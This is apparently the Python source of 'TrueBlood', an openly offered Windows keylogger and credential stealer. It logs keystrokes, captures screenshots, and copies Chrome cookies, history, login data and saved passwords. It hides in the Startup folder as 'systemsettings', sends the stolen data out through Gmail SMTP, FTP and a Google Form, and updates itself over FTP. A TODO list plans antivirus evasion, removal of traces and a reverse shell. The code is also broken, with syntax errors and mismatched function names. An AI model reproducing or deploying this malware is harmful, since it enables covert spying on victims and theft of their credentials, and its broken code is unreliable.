"""
▄▄▄█████▓ ██▀███   █    ██ ▓█████     ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄    
▓  ██▒ ▓▒▓██ ▒ ██▒ ██  ▓██▒▓█   ▀    ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌   
▒ ▓██░ ▒░▓██ ░▄█ ▒▓██  ▒██░▒███      ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌   
░ ▓██▓ ░ ▒██▀▀█▄  ▓▓█  ░██░▒▓█  ▄    ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌   
  ▒██▒ ░ ░██▓ ▒██▒▒▒█████▓ ░▒████▒   ░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓    
  ▒ ░░   ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░░ ▒░ ░   ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒    
    ░      ░▒ ░ ▒░░░▒░ ░ ░  ░ ░  ░   ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒    
  ░        ░░   ░  ░░░ ░ ░    ░       ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░    
            ░        ░        ░  ░    ░          ░  ░    ░ ░      ░ ░     ░       
                                           ░                            ░         

~ Improved by UniversalCoders
~ https://github.com/OfficialUniversalCoders

Version: v1.0

~ what it does:
-! ScreenShot
-! Send logs to email & FTP
-! Send logs to a google form     < > Finish the code

~ Gathers passwords from: 
> Chrome
> Firefox
> filezilla
> outlook
> putty
> skype
> networks

-! Cookie stealer

~ Gather system information:
-! Internal and external IP
-! platform 
-! Persistance 
-! Webcam logging
-! steam stealer > TODO

Requirements:
PyHook
PyWin32
Pyinstaller
Visual C++ compiler for python

TODO ~
Enable microphone
Steam creds stealer
Work on Linux and steal Linux information
Steal other browser data
Network spider
Permanently delete the log files after sending them over email to conceal traces
List all the running processors in the system
Send email or text when the user shuts down the computer, logs off or disconnects from the internet
evades all signature based Anti-viruses
Encrypt traffic accross the network using AES encryption
Detect virtual environment; if so stop the program from running
Detects when the user is accessing special important websites such as social media, banks, etc..
Create a script to "plug and play"
Steal databases, Git, Memeory, OpenSSH, OpenVPN, VNC and more. 
Steal more chats EX: Pidgin, Psi
Make code only touch memory without touching the disk.
Might make into backdoor? Reverse shell? 

Tested on:
Windows 10

Inspired by Radium & LaZagne, making it better! More features will be added!
"""

import os
import random
import errno
import socket
import base64
import pyHook
import shutil
import signal
import smtplib
import urllib2
import getpass
import logging
import platform
import win32api
import pythoncom
import subprocess
import datetime
import string
from ftplib import FTP
from PIL import ImageGrab
from email import Encoders
from Recoveries import Test
from contextlib import closing
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart


ip = base64.b64decode("")   #IP to connect to FTP server
ftpkey = base64.b64decode("")   #FTP password
ftpuser = base64.b64decode("")  #FTP username
passkey = base64.b64decode("")  #Password to connect to GMAIL 
userkey = base64.b64decode("")  #Username to connect to GMAIL  

buffer = ''
count_scr = 0
count_letter = 0
count_scremail = 0
check_count = 1234
SMTP_SERVER = "smtp.gmail.com"  #SMTP server address

filematch = "file.exe" # Needs to be equal to the exe you upload to FTP folder. 

directory = "/trueblood" # update exe should reside in /trueblood dir in FTIP server

current_system_time = datetime.datetime.now() 

path = "C:\Users\Public\output\logs" # Output and Logs folders will be under this path 
path_to_screenshot = "C:\Users\Public\Output\Logs\ScreenShot" # Screenshot will be saved to screenshot folder
path_to_cookies = "C:\Users\Public\Output\Logs" # Cookies will be in this folder
dir_zip = "C:\Users\Public\Output\Logs\ToZipScreenshots" #Contains ten screenshots and will zipped and sent as attachment
file_log = 'C:\Users\Public\Output\Logs\Output.txt'    #Contains keystrokes

currentdir = os.getcwd()    #Get current working directory
currentuser = getpass.getuser()  #Get current User

try:
	ip_addreess = socket.gethostbyname(socket.gethostbyname()) # Get the IP address
except:
	pass

try: 
	os.makedirs(path)
	os.makedirs(dir_zip)
	os.makedirs(path_to_screenshot)
except OSError as excepttion:
	if excepttion.errno != errno.EEXIST:
		raise

# See if the computer is connected to the Internet
def internet_on():
	try:
		response = urllib2.urlopen('http://pornhub.com', timeout=20)
		return True
	except urllib2.URLError as err:
		pass
	return False

def subprocess_args(include_stdout=True):
	if hasattr(subprocess, 'STARTUPINFO'):
		si = subprocess.STARTUPINFO()
		si.dwFlags != subprocess.STARTF_STARTF_USESHOWWINDOW
        env = os.environ
    else:
        si = None
        env = None

if include_stdout:
        ret = {'stdout:': subprocess.PIPE}
    else:
        ret = {}


    ret.update({'stdin': subprocess.PIPE,
                'stderr': subprocess.PIPE,
                'startupinfo': si,
                'env': env })
    return ret

# Get the Process ID
def getpid(process_name):
    return [item.split()[1] for item in os.popen('tasklist').read().splitlines()[4:] if process_name in item.split()]

# Get the Public IP
def getpublicip()
	try:
		return urllib2.urlopen('http://ip.42.pl/raw').read()
	except:
		pass

# Get the system information
def getsysteminfo():
	return platform.uname()


# Get the output of command ipconfig 
def getipcnfg():
	try:
		ipcfg_file = 'C:\Users\Public\Output\Logs\ipconfig.txt'
        f = open(ipcfg_file, "w")
        f.write(subprocess.check_output(["ipconfig", "/all"], **subprocess_args(False)))
        f.close()
    except Exception as e:
        print e

# Get save passwords from browsers, and other programs.
def getpasswords():
	passwords = Test.Result()
	return str(passwords.run())

# Combine all the information and save in the info file
def getslaveinfo():
    slave_info = 'C:\Users\Public\Output\Logs\info.txt'
    open_slave_info = open(slave_info, "w")
    try:
        open_slave_info.write(getpasswords() + "\n")
    except Exception as e:
        print e
    open_slave_info.write("\n------------------------------\n")
    try:
        open_slave_info.write(getpublicip() + "\n")
    except Exception as e:
        print e
    open_slave_info.write("\n------------------------------\n")
    try:
        open_slave_info.write(' '.join(str(s) for s in getsysinfo()) + '\n')
    except Exception as e:
        print e
    open_slave_info.close()

# Delete old exe after updating the current exe in victims pc
def deleteoldexe():
	checkfilename = 'systemsettings.exe' # The exe will be named systemsettings.exe in startup. When this updates the old one will be deleted
	checkdir = 'C://Users//' + currentuser + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//'
	dircontent = os.listdir(checkdir)

	try:
		try:
			pids = getpid('systemsettings.exe')
			for id in pids:
				os.kill(int(id), signal.SIGTERM)
		except Exception as e:
			print e

		if checkfilename in dircontent:
			os.remove(checkdir + checkfilename)
		except Exception as e:
			print e

# Make the exe boots on startup
def sendtostartup():
	try:

        originalfilename = "trueblood.py"  #This name should be equal to the name of exe/py that you create. Currently the name of this file is Radiumkeylogger.py
        
        coppiedfilename = 'systemsettings.py'    #The file will be copied to startup folder by this name
        
        copytodir = 'C://Users//' + currentuser + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//'
        
        copyfromdir = currentdir + "\\" + originalfilename

        filesindir = os.listdir(copytodir)

        if coppiedfilename not in filesindir:
            try:
                shutil.copy2(copyfromdir, copytodir + coppiedfilename)
            except Exception as e:
                print e

    except Exception as e:
        print e

    return True

# list directories content upto 3 level

def DriveTree():
    file_dir1 = 'C:\Users\Public\Output\Logs\Dir_View.txt'   #Drive hierarchy will be saved in this file
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    no_of_drives = len(drives)
    file_dir_O = open(file_dir1, "w")

    for d in range(no_of_drives):
        try:
            file_dir_O.write(str(drives[d]) + "\n")
            directories = os.walk(drives[d])
            next_dir = next(directories)

            next_directories = next_dir[1]
            next_files = next_dir[2]

            next_final_dir = next_directories + next_files

            for nd in next_final_dir:
                file_dir_O.write("	" + str(nd) + "\n")
                try:
                    sub_directories = os.walk(drives[d] + nd)

                    next_sub_dir = next(sub_directories)[1]
                    next_sub_sub_file = next(sub_directories)[2]

                    next_final_final_dir = next_sub_dir + next_sub_sub_file

                    for nsd in next_final_final_dir:
                        file_dir_O.write("		" + str(nsd) + "\n")

                        try:
                            sub_sub_directories = os.walk(drives[d] + nd + '\\' + nsd)

                            next_sub_sub_dir = next(sub_sub_directories)[1]
                            next_sub_sub_sub_file = next(sub_sub_directories)[2]

                            next_final_final_final_dir = next_sub_sub_dir + next_sub_sub_sub_file

                            for nssd in next_final_final_final_dir:
                                file_dir_O.write("			" + str(nssd) + "\n")
                        except Exception as e:
                            pass

                except Exception as e:
                    pass
        except Exception as e:
            pass

    file_dir_O.close()
    return True

# Send the data EX info.txt, browser data, login data, screenshots.
def sendData(fname, fext):
	attach = "C:\Users\Public\Output\Logs" + '\\' + fname + fext

	ts = current_system_time.strftime("%Y%m%d-%H%M%S")
	SERVER = SMTP_SERVER
	PORT = 465
	USER = userkey
	PASS = passkey
	FROM = USER
	TO = userkey

	SUBJECT = "Attachment " + "From --> " + currentuser + " Time --> " + str(ts)
    TEXT = "This attachment is sent from python" + '\n\nUSER : ' + currentuser + '\nIP address : ' + ip_address

	message = MIMEMultipart()
    message['From'] = FROM
    message['To'] = TO
    message['Subject'] = SUBJECT
    message.attach(MIMEText(TEXT))

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach, 'rb').read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
    message.attach(part)

    try:
        server = smtplib.SMTP_SSL()
        server.connect(SERVER, PORT)
        server.ehlo()
        server.login(USER, PASS)
        server.sendmail(FROM, TO, message.as_string())
        server.close()
    except Exception as e:
        print e

    return True

# Steal chrome cookies
def cookiestealer():
	cookiepath = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Local\Google\Chrome\User Data\Default'

	cookiefile = 'Cookies'

	historyfile = 'History'
    LoginDatafile = "Login Data"

    copycookie = cookiepath + "\\" + cookiefile
    copyhistory = cookiepath + "\\" + historyfile
    copyLoginData = cookiepath + "\\" + LoginDatafile

    filesindir = os.listdir(path_to_cookies)

    if copycookie not in filesindir:
        try:
            shutil.copy2(copycookie, path_to_cookies)
        except:
            pass


    if copyhistory not in filesindir:
        try:
            shutil.copy2(copyhistory, path_to_cookies)
        except:
            pass


    if copyLoginData not in filesindir:
        try:
            shutil.copy2(copyLoginData, path_to_cookies)
        except:
            pass

    return True

# Remote Google Form logs post
def googleremote():
	global data
	if len(data)>100:
		url="https://docs.google.com/forms/d/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx" #Specify Google Form URL here
		klog={'entry.xxxxxxxxxxx':data} #Specify the Field Name here
		try:
			dataenc=urllib.urlencode(klog)
            req=urllib2.Request(url,dataenc)
            response=urllib2.urlopen(req)
            data=''
        except Exception as e:
            print e
    return True


# Move all the files that are to be sent email to one place

def MoveAttachments(f_name):
    arch_name = "C:\Users\Public\Output\Logs\\" + f_name
    if f_name == 'Screenshots':
        files = os.listdir(arch_name)
        try:
            for i in range(10):
                try:
                    shutil.move(arch_name + "\\" + files[i], dir_zip)
                except Exception as e:
                    print e
        except Exception as e:
            print e
    else:
        try:
            shutil.move(arch_name, dir_zip)
        except Exception as e:
            print e

# Zip the files
def ZipAttachements(f_name):
	arch_name = "C:\Users\Public\Output\Logs\\" + f_name + "Attachments"
	files = os.listdir(dir_zip)

	try:
		shutil.make_archive(arch_name, 'zip', dir_zip)
	except Exception as e:
		pass

	for j in range(len(files)):
		try:
			os.remove(dir_zip + "\\" + files[j])
		except Exception as e:
			print e 

# Take Screenshots
def takescreenshots():
	ts = current_system_time.strftime("%Y%m%d-%H%M%S")
    try:
        scrimg = ImageGrab.grab()
        scrimg.save(path_to_screenshot + '\\' + str(ts) + '.png')
    except Exception as e:
        print e
    return True

# Upgrade the exe via ftp

def ftpupdate():
    try:
        chtodir = 'C://Users//' + currentuser + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//'
        try:
            os.chdir(chtodir)
        except Exception as e:
            print e

        ftp = FTP(ip)
        ftp.login(ftpuser, ftpkey)
        ftp.cwd(directory)

        for filename in ftp.nlst(filematch):
            fhandle = open(filename, 'wb')
            ftp.retrbinary('RETR ' + filename, fhandle.write)
            fhandle.close()

        if filematch in os.listdir(chtodir):
            deleteoldstub()
    except Exception as e:
        print e

    return True

# Send key strokes to email
def email():
	log_text = open(file_log, "rb")
    logtext = log_text.readlines()
    len_logtext = len(logtext)
    data = ""
    if internet_on() == True:
        for i in range(len_logtext):
            data = data + logtext[i]
        ts = current_system_time.strftime("%Y%m%d-%H%M%S")
        SERVER = SMTP_SERVER
        PORT = 465
        USER = userkey
        PASS = passkey
        FROM = USER
        TO = [userkey]
        SUBJECT = "Keylogger data " + "from --> " + currentuser + " Time --> " + str(ts)
        MESSAGE = data + '\n\nUSER : ' + currentuser + '\nIP address : ' + ip_address
        message = """\
From: %s
To: %s
Subject: %s

%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
        try:
            server = smtplib.SMTP_SSL()
            server.connect(SERVER, PORT)
            server.ehlo()
            server.login(USER, PASS)
            server.sendmail(FROM, TO, message)
            data = ''
            server.close()
            log_text = open(file_log, 'w')
            log_text.close()
        except Exception as e:
            print e
    return True

# Catching the key strokes and emailing them
def OnKeyboardEvent(event):
    global count_letter
    global count_scr
    global count_scremail
    global buffer
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')

    if event.Ascii == 13:
      
        buffer = current_system_time.strftime("%d/%m/%Y-%H|%M|%S") + ": " + buffer
        logging.log(10, buffer)
        buffer = ''
        count_letter = count_letter + 1
        count_scr = count_scr + 1
        
    elif event.Ascii == 8:
      
        buffer = buffer[:-1]
        count_letter = count_letter + 1
        count_scr = count_scr + 1
        
    elif event.Ascii == 9:
      
        keys = '\t'
        buffer = buffer + keys
        count_letter = count_letter + 1
        count_scr = count_scr + 1
        
    elif event.Ascii >= 32 and event.Ascii <= 127:
      
        keys = chr(event.Ascii)
        buffer = buffer + keys
        count_letter = count_letter + 1
        count_scr = count_scr + 1

    if count_letter == 300:
        count_letter = 0
        email()    #Keystrokes will be emailed after every 300 key strokes. You can change this if you want to.

    if count_scr == 500:
        count_scr = 0
        TakeScreenShot()    #Screenshot will be taken after 500 key strokes. You can change this if you want to.
        count_scremail +=  1
        if count_scremail == 10:
            count_scremail = 0
            MoveAttachments('Screenshots')
            ZipAttachments('Screenshots')
            sendData('ScreenshotsAttachments', '.zip')    #Screenshots will be emailed 10 at a time


return True
try:
    copytostartup()    #Copying the file to startup
except Exception as e:
    print e

if internet_on() == True:   #If internet is On
    try:
        if check_count == 1234:
            check_count = 0
            #Checking and updating the exe via ftp
            try:
                ftpupdate()
            except Exception as e:
                print e
            #Sending the attachments Directory tree, History, Login Data, Cookies, IP config and save passwords
            files_in_dir = os.listdir(path)
            if "DHLCiAttachments.zip" not in files_in_dir:
                DriveTree()
                try:
                    cookiestealer()
                except Exception as e:
                    print e
                getipcnfg()
                getslaveinfo()
                #Moving the attachment before zipping them and send
                try:
                    MoveAttachments('Dir_View.txt')
                    MoveAttachments('History')
                    MoveAttachments('Login Data')
                    MoveAttachments('Cookies')
                    MoveAttachments('ipconfig.txt')
                    MoveAttachments('info.txt')
                except Exception as e:
                    print e
                #Zipping the files
                ZipAttachments('DHLCi')
                #Sending the zip file
                sendData("DHLCiAttachments", ".zip")

            ts = current_system_time.strftime("%Y%m%d-%H%M%S")
            SERVER = SMTP_SERVER
            PORT = 465
            USER = userkey
            PASS = passkey
            FROM = USER
            TO = [userkey]
            SUBJECT = currentuser + ' : Slave is connected '
            MESSAGE = 'IP Address ---> ' + ip_address + '\nTime --> ' + str(ts)
            message = """\
From: %s
To: %s
Subject: %s
%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
            try:
                server = smtplib.SMTP_SSL()
                server.connect(SERVER, PORT)
                server.ehlo()
                server.login(USER, PASS)
                server.sendmail(FROM, TO, message)
                data = ''
                server.close()
            except Exception as e:
                print e
    except Exception as e:
        print e

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
